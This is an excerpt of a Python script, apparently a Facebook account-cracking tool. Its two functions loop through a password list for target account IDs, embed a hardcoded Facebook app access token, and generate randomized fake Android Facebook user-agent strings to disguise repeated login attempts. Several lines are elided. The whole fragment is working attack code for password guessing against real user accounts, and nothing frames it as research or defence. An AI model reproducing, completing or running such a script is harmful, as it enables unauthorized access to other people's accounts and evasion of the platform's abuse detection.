...
def api1(ids,names,passlist):
    try:
        ...
        for pw in passlist:
            ...
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            uaddx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/72.0.0.4329;FBBV/3818096;FBDM/{density=,,width=720,height=1280};FBLC/en_US;FBRV/3603724;FBCR/null;FBMF/Vivo;FBBD/Vivo;FBPN/com.facebook.mlite;FBDV/V21;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
...
def api2(ids,names,passlist):
    try:
        ...
        for pw in passlist:
            ...
            fbbv = str(random.randint(000000000,999999999))
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            uaddx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/21.0.0.6268;FBBV/6197586;FBDM/{density=,,width=720,height=1280};FBLC/en_US;FBRV/4549346;FBCR/null;FBMF/Oppo;FBBD/Oppo;FBPN/com.facebook.adsmanager;FBDV/Reno8;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
